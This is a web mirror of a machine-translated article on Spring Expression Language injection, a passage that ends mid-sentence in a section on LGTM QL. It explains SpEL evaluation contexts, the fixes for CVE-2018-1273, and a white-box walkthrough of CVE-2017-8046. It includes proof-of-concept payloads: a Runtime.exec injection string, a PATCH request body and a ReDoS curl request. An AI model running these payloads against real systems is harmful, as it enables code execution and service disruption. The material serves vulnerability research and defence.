<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèΩ‚Äçüé§ üßúüèª üë®üèª‚Äç‚öïÔ∏è Inje√ß√£o Spel üçã üõåüèΩ ‚úçÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Introdu√ß√£o 


 No processo de trabalhar e pesquisar v√°rios servi√ßos, podemos atender cada vez mais ao Spring Framework. E o passo l√≥gico √© se familiar...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Inje√ß√£o Spel</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/433034/"><img src="https://habrastorage.org/webt/me/ul/p3/meulp3hfrqubkhj4pxdhmslxeca.jpeg"><br><h1 id="intro">  Introdu√ß√£o </h1><br><p>  No processo de trabalhar e pesquisar v√°rios servi√ßos, podemos atender cada vez mais ao Spring Framework.  E o passo l√≥gico √© se familiarizar com sua estrutura e poss√≠veis vulnerabilidades. </p><br><p>  O mais interessante para qualquer Pentester s√£o as vulnerabilidades que levam √† execu√ß√£o do c√≥digo. </p><br><p>  Uma maneira de obter o RCE no Spring √© injetar express√µes SpEL. </p><br><p>  Neste artigo, tentaremos entender o que √© SpEL, onde ele pode ser encontrado, quais s√£o os recursos de uso e como encontrar essas inje√ß√µes. </p><a name="habracut"></a><br><h1 id="what">  O que? </h1><br><p>  <strong>SpEL</strong> √© uma linguagem de express√£o criada para o Spring Framework que suporta consultas e gerenciamento de gr√°ficos de objetos em tempo de execu√ß√£o. <br>  Tamb√©m √© importante observar que o SpEL foi criado como uma API que permite integr√°-lo a outros aplicativos e estruturas. </p><br><h1 id="gde-mozhno-vstretit">  Onde posso me encontrar? </h1><br><p>  √â l√≥gico que no <strong>Spring Framework</strong> SpEL seja usado o tempo todo.  Um bom exemplo √© o Spring Security, onde os direitos s√£o atribu√≠dos usando express√µes SpEL: </p><br><pre><code class="java hljs"><span class="hljs-meta"><span class="hljs-meta">@PreAuthorize</span></span>(<span class="hljs-string"><span class="hljs-string">"hasPermission(#contact, 'admin')"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deletePermission</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Contact contact, Sid recipient, Permission permission)</span></span></span></span>;</code> </pre> <br><p><img src="https://habrastorage.org/webt/2g/rq/gp/2grqgp1bk2lc_ajrxtbl4rcsrq4.png"></p><br><p>  O Apache Camel usa a API SpEL;  Abaixo est√£o exemplos de sua documenta√ß√£o. <br>  Forma√ß√£o de letras usando express√µes SpEL: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:foo"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span>#{request.headers['foo'] == 'bar'}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">to</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:bar"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Ou voc√™ pode usar uma regra de um arquivo externo, por exemplo, para especificar um cabe√ßalho: </p><br><pre> <code class="javascript hljs">.setHeader(<span class="hljs-string"><span class="hljs-string">"myHeader"</span></span>).spel(<span class="hljs-string"><span class="hljs-string">"resource:classpath:myspel.txt"</span></span>)</code> </pre> <br><p>  Aqui est√£o alguns exemplos vistos no GitHub: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://github.com/jpatokal/openflights</a> </p><br><p><img src="https://habrastorage.org/webt/se/wd/ge/sewdgepwblvm0cslrn30d5glbem.png"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://github.com/hbandi/LEP</a> </p><br><p><img src="https://habrastorage.org/webt/xm/nr/h2/xmnrh2rhtdc_eqlfpgqqmukaemu.png"></p><br><h1 id="osnovy-spring-framework-i-spel">  Spring Framework e no√ß√µes b√°sicas de SpEL </h1><br><p>  Para facilitar o entendimento do leitor sobre o que s√£o as inje√ß√µes de SpEL, voc√™ precisa conhecer um pouco o Spring e o SpEL. </p><br><p>  Um elemento-chave do Spring Framework √© o Spring Container.  Um cont√™iner cria objetos, os une, os configura e gerencia desde a cria√ß√£o at√© a destrui√ß√£o. </p><br><p>  Para controlar os componentes que comp√µem o aplicativo, o Spring Container usa <br>  Inje√ß√£o de Depend√™ncia.  √â quando os objetos s√£o configurados usando entidades externas chamadas Spring Beans - coloquialmente chamadas de "beans". </p><br><p>  O Spring Container recupera os metadados de configura√ß√£o do bean necess√°rio para obter as seguintes informa√ß√µes: instru√ß√µes sobre quais objetos instanciar e como configur√°-los por meio de metadados. </p><br><p>  Os metadados podem ser obtidos de tr√™s maneiras: </p><br><ul><li>  XML </li><li>  Anota√ß√µes Java </li><li>  C√≥digo Java </li></ul><br><p>  E outro ponto importante para n√≥s √© o Contexto do Aplicativo. </p><br><p>  <strong>ApplicationContext</strong> √© a interface principal em um aplicativo Spring que fornece informa√ß√µes de configura√ß√£o do aplicativo.  √â somente leitura em tempo de execu√ß√£o, mas pode ser recarregado, se necess√°rio e suportado pelo aplicativo.  O n√∫mero de classes que implementam a interface ApplicationContext est√° dispon√≠vel para v√°rios par√¢metros de configura√ß√£o e tipos de aplicativos.  De fato, √© o pr√≥prio aplicativo Spring.  O contexto tamb√©m fornece a capacidade de responder a v√°rios eventos que ocorrem no aplicativo e de controlar o ciclo de vida dos beans. </p><br><p><img src="https://habrastorage.org/webt/gz/pg/td/gzpgtdz46xowwzhkoa4vsld7utq.png"></p><br><p>  Agora, vamos nos concentrar diretamente nos m√©todos de defini√ß√£o de um bean e do uso de express√µes SpEL. </p><br><p>  <strong>Bean.xml</strong> </p><br><p>  Um exemplo de uso t√≠pico √© a integra√ß√£o do SpEL na cria√ß√£o de XML ou nas defini√ß√µes anotadas dos componentes do bean: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äúexmple</span></span></span><span class="hljs-tag">" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"org.spring.samples.NumberGuess"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"randomNumber"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ T(java.lang.Math).random() * 100.0 }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ systemProperties['user.region'] }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale2"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"${user.region}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Aqui est√° uma parte do c√≥digo no arquivo Bean.xml, para apenas um de seus beans.  Vale a pena prestar aten√ß√£o ao ID da lixeira, pela qual ela pode ser acessada, e √†s propriedades.  Porque  Como parte deste artigo, estamos considerando a possibilidade de usar o SpEL; no exemplo, v√°rias op√ß√µes para escrever essas express√µes ser√£o fornecidas. </p><br><p>  Para indicar ao Spring que as express√µes SpEL v√™m a seguir, o caractere # √© usado e a pr√≥pria express√£o √© colocada entre chaves: <code>#{SpEL_expression}</code> .  As propriedades podem ser referenciadas usando o caractere $ e colocando o nome da propriedade entre chaves: <code>${someProperty}</code> .  Os espa√ßos reservados de propriedade n√£o podem conter express√µes SpEL, mas as express√µes podem conter refer√™ncias de propriedade: </p><br><pre> <code class="json hljs"><span class="hljs-string"><span class="hljs-string">"#{${someProperty}"</span></span></code> </pre> <br><p>  Assim, voc√™ pode chamar qualquer classe Java de que precisamos ou, por exemplo, acessar vari√°veis ‚Äã‚Äãde ambiente, o que pode ser √∫til para determinar o nome de usu√°rio ou a vers√£o do sistema. </p><br><p>  A conveni√™ncia desse m√©todo de especificar beans √© a capacidade de alter√°-los sem recompilar o aplicativo inteiro, alterando assim o comportamento do aplicativo. </p><br><p>  No pr√≥prio aplicativo, voc√™ pode acessar esse bean usando a interface ApplicationContext, como mostrado abaixo: </p><br><pre> <code class="java hljs">ApplicationContext ctx = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ClassPathXmlApplicationContext(‚ÄúBean.xml‚Äù); MyExpression example = ctx.getBean(‚Äúexample<span class="hljs-string"><span class="hljs-string">", MyExpression.class); "</span></span> + <span class="hljs-string"><span class="hljs-string">"System.out.println(‚ÄúNumber : "</span></span> + example.getValue()); System.out.println(‚ÄúLocale : <span class="hljs-string"><span class="hljs-string">" + example.getDefaultLocale()); System.out.println(‚ÄúLocale : "</span></span> + example.getDefaultLocale2());</code> </pre><br><p>  I.e.  dentro do aplicativo, simplesmente obtemos os valores dos par√¢metros bin que cont√™m express√µes SpEL.  Spring, tendo recebido esse valor, executa a express√£o e retorna o resultado final.  Al√©m disso, n√£o esque√ßa que esse c√≥digo n√£o funcionar√° sem os getters correspondentes, mas sua descri√ß√£o est√° al√©m do escopo do artigo. </p><br><p>  Outra maneira de especificar beans √© o m√©todo de anota√ß√£o AnnotationBase - os valores dos par√¢metros s√£o definidos dentro da anota√ß√£o para alguma classe.  Nesse caso, o uso de vari√°veis ‚Äã‚Äãn√£o √© poss√≠vel. </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">FieldValueTestBean</span></span></span><span class="hljs-class"> @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Value</span></span></span><span class="hljs-class">("#</span></span>{ systemProperties[<span class="hljs-string"><span class="hljs-string">'user.region'</span></span>] }<span class="hljs-string"><span class="hljs-string">") private String defaultLocale; public void setDefaultLocale(String defaultLocale) { this.defaultLocale = defaultLocale; } public String getDefaultLocale() { return this.defaultLocale; } }</span></span></code> </pre> <br><p>  Para poder usar vari√°veis, ao criar express√µes SpEL, precisamos usar a interface ExpressionParser.  E, em seguida, uma classe aparece no c√≥digo do aplicativo, semelhante ao exemplo a seguir: </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseExpressionInterface</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Person personObj,String property)</span></span></span><span class="hljs-function"> </span></span>{ ExpressionParser parser = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); Expression exp = parser.parseExpression(property+<span class="hljs-string"><span class="hljs-string">" == 'Input'"</span></span>); StandardEvaluationContext testContext = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext(personObj); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> result = exp.getValue(testContext, Boolean.class);</code> </pre> <br><p>  ExpressionParser converte uma express√£o de seq√º√™ncia de caracteres em um objeto Expression.  Assim, o valor da express√£o analisada pode ser obtido na estrutura do EvaluationContext.  Este EvaluationContext ser√° o √∫nico objeto a partir do qual todas as propriedades e vari√°veis ‚Äã‚Äãna cadeia EL estar√£o dispon√≠veis. </p><br><p>  Vale a pena notar outro fato importante.  Com esse m√©todo de uso de SpEL, precisamos apenas da express√£o de string para conter # se, al√©m da pr√≥pria express√£o, ela contiver literais de string. </p><br><p>  De todas as alternativas acima, vale lembrar duas coisas: <br>  1) Se for poss√≠vel pesquisar pelo c√≥digo do aplicativo, √© necess√°rio procurar essas palavras-chave: SpelExpressionParser, EvaluationContext e parseExpression. <br>  2) Ponteiros importantes para Spring <code>#{SpEL}</code> , <code>${someProperty}</code> e <code>T(javaclass)</code> <br>  Se voc√™ quiser ler mais sobre Spring e SpEL, recomendamos que voc√™ preste aten√ß√£o √† documenta√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">docs.spring.io</a> . </p><br><h1 id="chto-voobsche-mozhet-spel">  O que o SpEL pode fazer? </h1><br><p>  De acordo com a documenta√ß√£o, o SpEL suporta as seguintes funcionalidades: </p><br><ul><li>  Express√µes literais </li><li>  Operadores booleanos e relacionais </li><li>  Express√µes regulares </li><li>  Express√µes de classe </li><li>  Acessando propriedades, matrizes, listas, mapas </li><li>  Chamada de m√©todo </li><li>  Operadores relacionais </li><li>  Atribui√ß√£o </li><li>  Chamando Construtores </li><li>  Refer√™ncias de Bean </li><li>  Constru√ß√£o de matriz </li><li>  Listas embutidas </li><li>  Mapas em linha </li><li>  Operador tern√°rio </li><li>  Vari√°veis </li><li>  Fun√ß√µes definidas pelo usu√°rio </li><li>  Proje√ß√£o de cole√ß√£o </li><li>  Sele√ß√£o de cole√ß√£o </li><li>  Express√µes modeladas </li></ul><br><p>  Como podemos ver, a funcionalidade SpEL √© muito rica e isso pode afetar adversamente a seguran√ßa do projeto se a entrada do usu√°rio entrar no ExpressionParser.  Portanto, o pr√≥prio Spring recomenda usar, em vez de um StandardEcalutionContext totalmente funcional, um SimpleEvaluationContext mais simples. </p><br><p>  Em suma, da import√¢ncia para n√≥s, SimpleEvaluationContext n√£o tem a capacidade de acessar classes Java e referenciar outros beans. </p><br><p>  Uma descri√ß√£o completa dos recursos √© melhor explorada no site de documenta√ß√£o: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">StandardEvaluationContext</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">SimpleEvaluationContext</a> </p><br><p>  Algumas corre√ß√µes s√£o baseadas na diferen√ßa de funcionalidade do SpEL, que √© executada em diferentes contextos, mas falaremos sobre isso um pouco mais tarde. </p><br><p>  Para deixar tudo muito claro, damos um exemplo.  Temos uma linha claramente maliciosa que cont√©m uma express√£o SpEL: </p><br><pre> <code class="java hljs">String inj = <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span></span>;</code> </pre> <br><p>  E h√° dois contextos: </p><br><pre> <code class="java hljs">StandardEvaluationContext std_c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext();</code> </pre> <br><p>  e </p><br><pre> <code class="java hljs">EvaluationContext simple_c = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</code> </pre> <br><p>  Express√£o exp = parser.parseExpression (inj); <br> <code>java exp.getValue(std_c);</code>  - <strong>a calculadora ser√° lan√ßada</strong> <br> <code>java exp.getValue(simple_c);</code>  - <strong>receberemos uma mensagem de erro</strong> </p><br><p>  Um ponto igualmente interessante √© que podemos come√ßar a processar a express√£o sem especificar nenhum contexto: <code>exp.getValue();</code> <br>  Nesse caso, a express√£o ser√° executada dentro do contexto padr√£o e, como resultado, o c√≥digo malicioso ser√° executado.  Portanto, se voc√™ √© um programador e usa Spring - nunca se esque√ßa de definir o contexto no qual a express√£o deve ser executada. </p><br><p>  Dissemos um pouco antes que algumas corre√ß√µes s√£o constru√≠das sobre as diferen√ßas entre os recursos de SpEL dentro dos contextos.  Considere um exemplo dessa corre√ß√£o. </p><br><p>  <strong>CVE 2018-1273 Spring Data Commons</strong> <br>  Esta vulnerabilidade foi encontrada no m√©todo setPropertyValue e foi baseada em dois problemas: <br>  1) Saneamento insuficiente dos valores da vari√°vel que se enquadra no ExpressionParser. <br>  2) Execu√ß√£o da express√£o no quadro do contexto padr√£o. </p><br><p>  Aqui est√° uma captura de tela da parte vulner√°vel do c√≥digo: </p><br><p><img src="https://habrastorage.org/webt/rb/84/_7/rb84_76_bpq3ywrf-icytp5hvs8.png"></p><br><p>  Porque  o nome da propriedade n√£o exigia processamento complexo na estrutura do SpEL; a solu√ß√£o l√≥gica era substituir o contexto, resultando no seguinte c√≥digo: </p><br><p><img src="https://habrastorage.org/webt/xw/re/ue/xwreueydsgforfjf365mwdrpcuc.png"></p><br><p>  As capturas de tela mostram as partes do c√≥digo que definem o contexto e a express√£o que ser√° executada.  Mas a execu√ß√£o da express√£o ocorre em outro lugar: </p><br><pre> <code class="java hljs">expression.setValue(context, value);</code> </pre> <br><p>  √â aqui que √© indicado que estamos executando uma express√£o SpEL para o valor value dentro do contexto especificado. <br>  O uso do SimpleEvaluationContext ajudou a proteger contra a implementa√ß√£o da classe Java no parseExpression. Agora, em vez de executar o c√≥digo no log do servidor, veremos um erro: </p><br><pre> <code class="java hljs">Type cannot be found <span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span></code> </pre> <br><p>  Mas isso n√£o resolveu o problema com a falta de saneamento suficiente e manteve a capacidade de realizar um ataque de refazer: </p><br><pre> <code class="bash hljs">curl -X POST http://localhost:8080/account -d <span class="hljs-string"><span class="hljs-string">"name['aaaaaaaaaaaaaaaaaaaaaaaa!'%20matches%20'%5E(a%2B)%2B%24']=test"</span></span></code> </pre> <br><p>  Portanto, a pr√≥xima corre√ß√£o j√° inclu√≠a a limpeza do nome do par√¢metro. </p><br><h1 id="ot-teorii-k-praktike">  Da teoria √† pr√°tica! </h1><br><p>  Agora, vamos ver v√°rias maneiras de procurar inje√ß√£o de SpEL usando o m√©todo White Box. </p><br><h2 id="step-by-step-cve-2017-8046">  Passo a passo CVE-2017-8046 </h2><br><p>  Primeiro, voc√™ precisa encontrar um local para processar express√µes SpEL.  Para fazer isso, voc√™ pode simplesmente usar nossa recomenda√ß√£o e encontrar palavras-chave no c√≥digo.  Lembre-se destas palavras: SpelExpressionParser, EvaluationContext e parseExpression. </p><br><p>  Outra op√ß√£o √© usar v√°rios plugins para encontrar erros no c√≥digo.  At√© agora, o √∫nico plugin que aponta para uma poss√≠vel inje√ß√£o de SpEL foi o findsecbugs-cli. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://github.com/find-sec-bugs</a> </p><br><p>  Ent√£o, encontramos o local em que estamos interessados ‚Äã‚Äãno c√≥digo.  Digamos que usando findsecbugs-cli: </p><br><p><img src="https://habrastorage.org/webt/wg/_w/s5/wg_ws5vbnh1z6vds1-gxjc3zhk0.png"></p><br><p>  No c√≥digo do aplicativo, veremos o seguinte: </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PathToSpEL</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> SpelExpressionParser SPEL_EXPRESSION_PARSER = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> List&lt;String&gt; APPEND_CHARACTERS = Arrays.asList(<span class="hljs-string"><span class="hljs-string">"-"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/** * Converts a patch path to an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression}. * * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@param</span></span></span><span class="hljs-comment"> path the patch path to convert. * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@return</span></span></span><span class="hljs-comment"> an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression} */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> Expression </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pathToExpression</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SPEL_EXPRESSION_PARSER.parseExpression(pathToSpEL(path)); }</code> </pre> <br><p>  O pr√≥ximo passo √© descobrir onde a vari√°vel de caminho entra no analisador de express√µes.  Uma das maneiras mais convenientes e gratuitas seria usar a fun√ß√£o IntelijIdea IDE - Analyze Dataflow: </p><br><p><img src="https://habrastorage.org/webt/gd/ud/ag/gdudag-ykwbmvin_70mowuh838u.png"></p><br><p>  Ao desenrolar a cadeia, por exemplo, para substituir e estudar os m√©todos e classes especificados, obtemos o seguinte: </p><br><p>  O m√©todo ReplaceOperation assume o valor da vari√°vel de caminho. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ReplaceOperation</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path, Object value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>, path, value); }</code> </pre> <br><p>  E para chamar o m√©todo de substitui√ß√£o, voc√™ precisa passar a vari√°vel "op" com o valor "replace" para JSON. </p><br><pre> <code class="java hljs">JsonNode opNode = elements.next(); String opType = opNode.get(<span class="hljs-string"><span class="hljs-string">"op"</span></span>).textValue(); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (opType.equals(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>)) { ops.add(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ReplaceOperation(path, value));</code> </pre> <br><p>  Da mesma forma, encontramos todos os lugares onde o usu√°rio pode passar o valor necess√°rio para a vari√°vel do caminho.  E ent√£o uma das op√ß√µes de explora√ß√£o para a vulnerabilidade ficar√° assim: <br>  M√©todo de solicita√ß√£o: PATCH <br>  Organismo de solicita√ß√£o: </p><br><pre> <code class="json hljs">[{ <span class="hljs-attr"><span class="hljs-attr">"op"</span></span> : <span class="hljs-string"><span class="hljs-string">"add"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"path"</span></span> : <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"value"</span></span> : <span class="hljs-string"><span class="hljs-string">"pwned"</span></span> }]</code> </pre> <br><h2 id="ispolzovanie-lgtm-ql">  Usando LGTM QL </h2><br><p>  O uso do LGTM QL (para os fins deste artigo, simplesmente o reduzimos para QL) √© outra maneira interessante de procurar vulnerabilidades. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://lgtm.com</a> </p><br><p>  Deve estipular imediatamente sua falta.  De gra√ßa, voc√™ pode analisar apenas projetos que est√£o em reposit√≥rios abertos no GitHub, porque  Para tirar uma foto do projeto, a LGTM carrega o projeto no servidor e o compila l√°.  Mas se isso n√£o incomod√°-lo, o LGTM QL abrir√° grandes oportunidades para voc√™ analisar o c√≥digo do aplicativo. </p><br><p>  Ent√£o, o que √© an√°lise de aplicativos QL? </p><br><p>  Para come√ßar, como j√° dissemos, voc√™ precisar√° criar um instant√¢neo do aplicativo. </p><br><p>  Quando o instant√¢neo estiver pronto, e isso pode levar v√°rias horas, voc√™ poder√° come√ßar a escrever uma consulta semelhante ao SQL como parte da sintaxe da QL.  Para fazer isso, voc√™ pode usar o plug-in para Eclipse ou atuar diretamente no console na p√°gina QL do projeto. </p><br><p>  Porque  Agora, estamos considerando o Spring, e essa √© a estrutura para Java, voc√™ precisar√° descrever a classe de seu interesse e o m√©todo dessa classe, cuja 